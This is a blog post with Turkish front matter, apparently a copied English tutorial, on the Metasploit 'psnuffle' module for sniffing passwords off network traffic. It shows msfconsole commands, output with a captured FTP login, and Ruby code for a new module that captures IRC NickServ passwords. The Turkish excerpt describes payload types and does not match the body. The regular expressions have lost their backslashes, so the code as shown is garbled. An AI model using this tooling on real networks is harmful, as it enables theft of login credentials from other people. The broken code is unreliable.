---
layout: post
title: MSF İçinde Parola Dinleme
date: 2017-05-16 08:30:06.000000000 +02:00
type: post
img: metasploit.jpg
published: false
status: publish
categories:
- Nasıl
- Araştırma
tags:
- msfconsole
- metasploit Framework
- Metasploit Framework parola tarama
- msf parola dinleme
excerpt: Payload, bir exploit modül türünü ifade eder. Metasploit Framework içerisinde 3 farklı grup payload modülü bulunur. Tekil, Sahneleyiciler ve Sahneler (Singles, Stagers ve Stages) olarak ayırabileceğimiz bu modüllere bakacağız. 
---

Max Moser released a Metasploit password sniffing module named ‘psnuffle‘ that will sniff passwords off the wire similar to the tool dsniff. It currently supports pop3, imap, ftp, and HTTP GET. More information is available on his blog.

Using the psnuffle module is extremely simple. There are some options available but the module works great “out of the box”.

msf > use auxiliary/sniffer/psnuffle
msf auxiliary(psnuffle) > show options

Module options:

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   FILTER                      no        The filter string for capturing traffic
   INTERFACE                   no        The name of the interface
   PCAPFILE                    no        The name of the PCAP capture file to process
   PROTOCOLS  all              yes       A comma-delimited list of protocols to sniff or "all".
   SNAPLEN    65535            yes       The number of bytes to capture
   TIMEOUT    1                yes       The number of seconds to wait for new data
There are some options available, including the ability to import a PCAP capture file. We will run the psnuffle scanner in its default mode.

msf auxiliary(psnuffle) > run
[*] Auxiliary module execution completed
[*] Loaded protocol FTP from /usr/share/metasploit-framework/data/exploits/psnuffle/ftp.rb...
[*] Loaded protocol IMAP from /usr/share/metasploit-framework/data/exploits/psnuffle/imap.rb...
[*] Loaded protocol POP3 from /usr/share/metasploit-framework/data/exploits/psnuffle/pop3.rb...
[*] Loaded protocol URL from /usr/share/metasploit-framework/data/exploits/psnuffle/url.rb...
[*] Sniffing traffic.....
[*] Successful FTP Login: 192.168.1.100:21-192.168.1.5:48614 >> victim / pass (220 3Com 3CDaemon FTP Server Version 2.0)
There! We’ve captured a successful FTP login. This is an excellent tool for passive information gathering.

Psnuffle is easy to extend due to its modular design. This section will guide through the process of developing an IRC (Internet Relay Chat) protocol sniffer (Notify and Nick messages).

Module Location

All the different modules are located in data/exploits/psnuffle. The names are corresponding to the protocol names used inside psnuffle. To develop our own module, we take a look at the important parts of the existing pop3 sniffer module as a template.

self.sigs = {
:ok => /^(+OK[^n]*)n/si,
:err => /^(-ERR[^n]*)n/si,
:user => /^USERs+([^n]+)n/si,
:pass => /^PASSs+([^n]+)n/si,
:quit => /^(QUITs*[^n]*)n/si }
This section defines the expression patterns which will be used during sniffing to identify interesting data. Regular expressions look very strange at the beginning but are very powerful. In short everything within () will be available within a variable later on in the script.

Defining our own psnuffle module

self.sigs = {
:user => /^(NICKs+[^n]+)/si,
:pass => /b(IDENTIFYs+[^n]+)/si,}
For IRC this section would look like the ones above. Not all nickservers are using IDENTIFY to send the password, but the one on Freenode does.

Session Definition

For every module we first have to define what ports it should handle and how the session should be tracked.

return if not pkt[:tcp] # We don't want to handle anything other than tcp
return if (pkt[:tcp].src_port != 6667 and pkt[:tcp].dst_port != 6667) # Process only packet on port 6667

#Ensure that the session hash stays the same for both way of communication
if (pkt[:tcp].dst_port == 6667) # When packet is sent to server
s = find_session("#{pkt[:ip].dst_ip}:#{pkt[:tcp].dst_port}-#{pkt[:ip].src_ip}:#{pkt[:tcp].src_port}")
else # When packet is coming from the server
s = find_session("#{pkt[:ip].src_ip}:#{pkt[:tcp].src_port}-#{pkt[:ip].dst_ip}:#{pkt[:tcp].dst_port}")
end
Now that we have a session object that uniquely consolidates info, we can go on and process packet content that matched one of the regular expressions we defined earlier.

case matched
when :user # when the pattern "/^(NICKs+[^n]+)/si" is matching the packet content
s[:user]=matches #Store the name into the session hash s for later use
# Do whatever you like here... maybe a puts if you need to
when :pass # When the pattern "/b(IDENTIFYs+[^n]+)/si" is matching
s[:pass]=matches # Store the password into the session hash s as well
if (s[:user] and s[:pass]) # When we have the name and the pass sniffed, print it
print "-> IRC login sniffed: #{s[:session]} >> username:#{s[:user]} password:#{s[:pass]}n"
end
sessions.delete(s[:session]) # Remove this session because we dont need to track it anymore
when nil
# No matches, don't do anything else # Just in case anything else is matching...
sessions[s[:session]].merge!({k => matches}) # Just add it to the session object
end